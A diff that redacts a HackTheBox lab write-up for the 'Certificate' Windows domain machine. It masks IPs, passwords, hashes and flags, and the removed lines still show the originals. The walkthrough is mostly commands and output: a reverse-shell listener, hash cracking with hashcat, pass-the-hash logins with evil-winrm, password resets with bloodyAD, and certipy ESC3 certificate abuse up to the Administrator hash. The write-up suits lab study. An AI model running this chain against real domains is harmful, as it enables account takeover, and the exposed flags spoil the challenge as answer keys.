@@ -15,9 +15,9 @@ Author: [Spectra199](https://app.hackthebox.com/users/414823)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.8.163
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-31 23:27 EDT
-Nmap scan report for 10.129.8.163
+Nmap scan report for 10.129.xx.xx
 Host is up (0.026s latency).
 Not shown: 987 filtered tcp ports (no-response)
 PORT     STATE SERVICE       VERSION
@@ -75,7 +75,7 @@ Nmap done: 1 IP address (1 host up) scanned in 108.46 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.8.163 certificate.htb DC01.certificate.htb
+10.129.xx.xx certificate.htb DC01.certificate.htb
 ```
 
 This time this machine has a web server running on port 80. Let's go through and enumerate it.
@@ -284,7 +284,7 @@ On the target machine: <br>
 ```bash
 └─$ rlwrap nc -lvnp 1337
 listening on [any] 1337 ...
-connect to [10.10.14.7] from (UNKNOWN) [10.129.177.210] 54932
+connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 54932
 whoami
 certificate\xamppuser
 PS C:\xampp\htdocs\certificate.htb\static\uploads\18c653d9889c21376701ae2c1013be8f\files>
@@ -331,7 +331,7 @@ PS C:\xampp\htdocs\certificate.htb> type db.php
 try {
     $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
     $db_user = 'certificate_webapp_user'; // Change to your DB username
-    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
+    $db_passwd = 'cert!f!c@texxxxx'; // Change to your DB password
     $options = [
         PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
         PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
@@ -347,7 +347,7 @@ Got the credentials for the database. Let's try to connect to the database and s
 
 ### Database Enumeration
 ```powershell
-PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD Certificate_WEBAPP_DB -e "SHOW databases;"
+PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@texxxxx Certificate_WEBAPP_DB -e "SHOW databases;"
 Database
 certificate_webapp_db
 information_schema
@@ -356,8 +356,8 @@ test
 
 Let's check out the `certificate_webapp_db` database.
 ```powershell
-PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD Certificate_WEBAPP_DB -e "USE certificate_webapp_db;"
-PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD Certificate_WEBAPP_DB -e "SHOW tables;"
+PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@texxxxx Certificate_WEBAPP_DB -e "USE certificate_webapp_db;"
+PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@texxxxx Certificate_WEBAPP_DB -e "SHOW tables;"
 Tables_in_certificate_webapp_db
 course_sessions
 courses
@@ -367,14 +367,14 @@ users_courses
 
 Check the `users` table.
 ```powershell
-PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@teDBPWD Certificate_WEBAPP_DB -e "SELECT * FROM users;"
+PS C:\xampp\htdocs\certificate.htb> C:\xampp\mysql\bin\mysql.exe -u certificate_webapp_user -pcert!f!c@texxxxx Certificate_WEBAPP_DB -e "SELECT * FROM users;"
 id      first_name      last_name       username        email   password        created_at      role    is_active
 1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
 6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
 7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
 8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
 9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
-10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
+10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.<SNIP>    2024-12-25 21:31:26     admin   1
 12      test123123      test123123      test123123      test123123@gmail.com    $2y$04$qBLsE/60eWdSpET5RnESPO5Nf7rC.TS4FOAnBP6I45rQdPi6YTR3G    2025-06-01 05:34:22     student 1
 ```
 
@@ -397,17 +397,17 @@ It's use `bcrypt` hash. Let's choose `mode` in `hashcat` to perform password cra
 
 The first one is best suit `3200` mode. <br>
 ```bash
-└─$ echo "$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6" > sarab.hash
+└─$ echo "$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.<SNIP>" > sarab.hash
 
 └─$ hashcat -m 3200 sarab.hash /usr/share/wordlists/rockyou.txt
 
 └─$ hashcat -m 3200 sarab.hash /usr/share/wordlists/rockyou.txt --show
-$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182
+$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.<SNIP>:Blinkxxx
 ```
 
-Got another credentials `sara.b:Blink182`. <br>
+Got another credentials `sara.b:Blinkxxx`. <br>
 ```text
-└─$ evil-winrm -i certificate.htb -u "sara.b" -p "Blink182"
+└─$ evil-winrm -i certificate.htb -u "sara.b" -p "Blinkxxx"
                                         
 Evil-WinRM shell v3.7
                                         
@@ -475,7 +475,7 @@ What we have: <br>
 - `Domain` : `WS-01`
 - `Server challenge` : **Not found yet**
 - `Computer response (NTProofStr)` : `3ff29ba4b51e86ed1065c438b6713f28`
-- `NTLMv2 Client Challenge` : `3ff29ba4b51e86ed1065c438b6713f2801010000000000000588e3da922edb012a49d5aaa4eeea0c00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001e0063006500720074006900660069006300610074006500`
+- `NTLMv2 Client Challenge` : `3ff29ba4b51e86ed1065c438b6713f28<SNIP>`
 
 Need to found the `Server challenge`, following up that request to `TCP Stream`.
 
@@ -485,10 +485,10 @@ Need to found the `Server challenge`, following up that request to `TCP Stream`.
 Found out the `Server challenge` is `0f18018782d74f81`. <br>
 
 Let's put it all together and crack this hash. <br>
-&rarr; `Administrator::WS-01:0f18018782d74f81:3ff29ba4b51e86ed1065c438b6713f28:01010000000000000588e3da922edb012a49d5aaa4eeea0c00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001e0063006500720074006900660069006300610074006500`
+&rarr; `Administrator::WS-01:0f18018782d74f81:3ff29ba4b51e86ed1065c438b6713f28:<SNIP>`
 
 ```text
-└─$ echo "Administrator::WS-01:0f18018782d74f81:3ff29ba4b51e86ed1065c438b6713f28:01010000000000000588e3da922edb012a49d5aaa4eeea0c00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001e0063006500720074006900660069006300610074006500" > administrator.hash
+└─$ echo "Administrator::WS-01:0f18018782d74f81:3ff29ba4b51e86ed1065c438b6713f28:<SNIP>" > administrator.hash
 
 └─$ hashcat -h | grep -i netntlmv2                             
    5600 | NetNTLMv2                                                  | Network Protocol
@@ -539,9 +539,9 @@ Kerberos
         padata: 2 items
             PA-DATA pA-ENC-TIMESTAMP
                 padata-type: pA-ENC-TIMESTAMP (2)
-                    padata-value: 3041a003020112a23a043823f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
+                    padata-value: 3041a003020112a23a0438<SNIP>
                         etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)
-                        cipher: 23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
+                        cipher: <SNIP>
             PA-DATA pA-PAC-REQUEST
                 padata-type: pA-PAC-REQUEST (128)
                     padata-value: 3005a0030101ff
@@ -583,9 +583,9 @@ We got: <br>
 - `etype` : `18`
 - `user` : `Lion.SK`
 - `realm` : `CERTIFICATE.HTB`
-- `cipher` : `23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0`
+- `cipher` : `<SNIP>`
 
-&rarr; `$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0`
+&rarr; `$krb5pa$18$Lion.SK$CERTIFICATE.HTB$<SNIP>`
 
 Let's try to crack it.
 ```bash
@@ -607,7 +607,7 @@ hashcat (v6.2.6) starting
 
 ...
 
-$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
+$krb5pa$18$Lion.SK$CERTIFICATE.HTB$<SNIP>:!QAZ2xxx
                                                           
 Session..........: hashcat
 Status...........: Cracked
@@ -635,7 +635,7 @@ Stopped: Tue Jun  3 05:44:56 2025
 Got the password for `lion.sk` user. <br>
 
 ```text
-└─$ evil-winrm -i certificate.htb -u "lion.sk" -p '!QAZ2wsx'
+└─$ evil-winrm -i certificate.htb -u "lion.sk" -p '!QAZ2xxx'
                                         
 Evil-WinRM shell v3.7
                                         
@@ -662,7 +662,7 @@ This `.pcap` file is great that we unable to crack `Administrator` hash but can 
 ### Active Directory Certificate Services (AD CS)
 If we continue this flow, let's find the vulnerability template for `lion.sk` user.
 ```bash
-└─$ certipy find -u lion.sk -p '!QAZ2wsx'  -target certificate.htb -text -stdout -vulnerable 
+└─$ certipy find -u lion.sk -p '!QAZ2xxx'  -target certificate.htb -text -stdout -vulnerable 
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
@@ -764,7 +764,7 @@ Found out that `Delegated-CRA` template is vulnerable to `ESC3` attack. <br>
 
 First, we will obtain an Delegated-CRA certificate.
 ```bash
-└─$ certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.129.136.196 -target DC01.certificate.htb -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'        
+└─$ certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2xxx' -dc-ip 10.129.xx.xx -target DC01.certificate.htb -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'        
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -778,7 +778,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 Then use the Delegated-CRA certificate to request a certificate on behalf of the target user.
 ```bash
-└─$ certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.129.136.196 -target DC01.certificate.htb -ca 'Certificate-LTD-CA' -template 'User' -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\ryan.k'
+└─$ certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2xxx' -dc-ip 10.129.xx.xx -target DC01.certificate.htb -ca 'Certificate-LTD-CA' -template 'User' -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\ryan.k'
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -792,7 +792,7 @@ Would you like to save the private key? (y/N): y
 
 Hmm, look like there is this template is not supported, let's to find enable template to request certificate on behalf of the target user.
 ```bash
-└─$ certipy find -u lion.sk -p '!QAZ2wsx' -target certificate.htb -enabled -stdout
+└─$ certipy find -u lion.sk -p '!QAZ2xxx' -target certificate.htb -enabled -stdout
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.; Server Do53:172.16.147.2@53 answered The DNS operation timed out.
@@ -941,7 +941,7 @@ Certificate Templates
 Found out that `SignedUser` template is enabled and can be used to request certificate on behalf of the target user. <br>
 
 ```bash
-└─$ certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2wsx' -dc-ip 10.129.136.196 -target DC01.certificate.htb -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\ryan.k'   
+└─$ certipy req -u 'lion.sk@certificate.htb' -p '!QAZ2xxx' -dc-ip 10.129.xx.xx -target DC01.certificate.htb -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx lion.sk.pfx -on-behalf-of 'CERTIFICATE\ryan.k'   
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -955,7 +955,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 Now we can authenticate using the "on-behalf-of" certificate.
 ```bash
-└─$ certipy auth -pfx ryan.k.pfx -username 'ryan.k' -domain 'certificate.htb' -dc-ip 10.129.136.196                                                                         
+└─$ certipy auth -pfx ryan.k.pfx -username 'ryan.k' -domain 'certificate.htb' -dc-ip 10.129.xx.xx                                                                         
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Certificate identities:
@@ -967,13 +967,13 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Saving credential cache to 'ryan.k.ccache'
 [*] Wrote credential cache to 'ryan.k.ccache'
 [*] Trying to retrieve NT hash for 'ryan.k'
-[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:beb8327809ebfd3d69cc1764335687cf
+[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:<SNIP>
 ```
 
 Got the `ryan.k` user hash. <br>
 
 ```text
-└─$ evil-winrm -i certificate.htb -u "ryan.k" -H "beb8327809ebfd3d69cc1764335687cf"
+└─$ evil-winrm -i certificate.htb -u "ryan.k" -H "<SNIP>"
                                         
 Evil-WinRM shell v3.7
                                         
@@ -1002,7 +1002,7 @@ This has been exploited later below, we can see that there are 2 approach to exp
 
 ### Bloodhound
 ```bash
-└─$ bloodhound-python -u 'sara.b' -p 'Blink182' -d certificate.htb -c All -o bloodhound_results.json -ns 10.129.8.163       
+└─$ bloodhound-python -u 'sara.b' -p 'Blinkxxx' -d certificate.htb -c All -o bloodhound_results.json -ns 10.129.xx.xx       
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: certificate.htb
 INFO: Getting TGT for user
@@ -1041,7 +1041,7 @@ So this group has `GenericAll` to `lion.sk` and `ryan.k` user. <br>
 
 ### Reset Password
 ```bash
-└─$ bloodyAD -u sara.b -p 'Blink182' -d certificate.htb --dc-ip 10.129.8.163 set password lion.sk 'P4ssword@123'
+└─$ bloodyAD -u sara.b -p 'Blinkxxx' -d certificate.htb --dc-ip 10.129.xx.xx set password lion.sk 'P4ssword@123'
 [+] Password changed successfully!
 ```
 
@@ -1070,7 +1070,7 @@ Mode                LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\Lion.SK\Desktop> type user.txt
-79d2b5652dd8915c688f7660c9424117
+79d2b5xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Got the `user.txt` flag. <br>
@@ -1094,7 +1094,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 Hmm, seem like nothing interesting. <br>
 Let's check out the `ryan.k` user. Also change the password for `ryan.k` user.
 ```bash
-└─$ bloodyAD -u sara.b -p 'Blink182' -d certificate.htb --dc-ip 10.129.8.163 set password ryan.k 'P4ssword@1234'
+└─$ bloodyAD -u sara.b -p 'Blinkxxx' -d certificate.htb --dc-ip 10.129.xx.xx set password ryan.k 'P4ssword@1234'
 [+] Password changed successfully!
 ```
 
@@ -1233,7 +1233,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 Now let's authenticate with the forged certificate.
 ```bash
-└─$ certipy auth -pfx admin_forged.pfx -dc-ip 10.129.8.163   
+└─$ certipy auth -pfx admin_forged.pfx -dc-ip 10.129.xx.xx   
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Certificate identities:
@@ -1244,7 +1244,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Saving credential cache to 'administrator.ccache'
 [*] Wrote credential cache to 'administrator.ccache'
 [*] Trying to retrieve NT hash for 'administrator'
-[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
+[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:<SNIP>
 ```
 
 - `certipy auth`: Certipy's Authentication module
@@ -1255,7 +1255,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 We are able to grab the Administrator's hash. <br>
 ```text
-└─$ evil-winrm -i certificate.htb -u "administrator" -H "d804304519bf0143c14cbf1c024408c6"
+└─$ evil-winrm -i certificate.htb -u "administrator" -H "<SNIP>"
                                         
 Evil-WinRM shell v3.7
                                         
@@ -1278,7 +1278,7 @@ Mode                LastWriteTime         Length Name
 
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-4315e47d3c2ae54fa05861daaec3c02b
+4315e4xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Got the `root.txt` flag. <br>
